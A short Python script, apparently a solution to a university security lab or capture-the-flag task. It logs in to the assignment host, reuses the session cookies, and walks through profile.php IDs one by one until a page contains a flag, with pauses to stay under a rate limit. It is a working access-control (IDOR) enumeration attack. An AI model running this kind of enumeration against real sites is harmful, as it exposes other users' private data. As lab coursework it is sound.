import requests
import html
import itertools
import threading
import time
import sys


def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rresting ' + c)
        sys.stdout.flush()
        time.sleep(1)
    

j = 1 # counter to limit requests - 30 Reqs per mins~
i=1
done = False
print("Please enter a valid  user and pass to login, assignment-plutus.unimelb.life")

username = input('Enter a username:')
password = input('Enter a pass:')

payload = {
    'user': username,
    'pass': password
}

# make request to login and get cookies  -  csrf
POST_LOGIN_URL = 'http://assignment-plutus.unimelb.life/auth.php'
s = requests.Session()
r = s.post(POST_LOGIN_URL, data=payload)
print("\nCSRF COOKIE: ", s.cookies['CSRF_token'])
print("PHPSESSID: ",s.cookies['PHPSESSID'])
cookies = {'PHPSESSID': s.cookies['PHPSESSID'], 'CSRF_token' : s.cookies['CSRF_token']}

print("_______Loged in ... Wait for Results________")

try:
    while True:
        
        done = False
        url = 'http://assignment-plutus.unimelb.life/profile.php?id='+str(i)
        r = requests.get(url, cookies=cookies)
        #print(r.headers["Content-Length"])
        res = r.content
        decodeRes= str(html.unescape(res.decode('UTF-8')))
        # print(decodeRes.find("sajeeb"))
        
        if(decodeRes.find("FLAG")>0):
            print("Anomaly founded: ", i)
            break
        i = i + 1
        j = j+1
        if(j==5):
            t = threading.Thread(target=animate)
            print("\nended on ",i)
            
            t.start()
            j = 0
            time.sleep(5)
            
            done = True
            t.join()  #wait for thread

except KeyboardInterrupt:
    print("exited")
    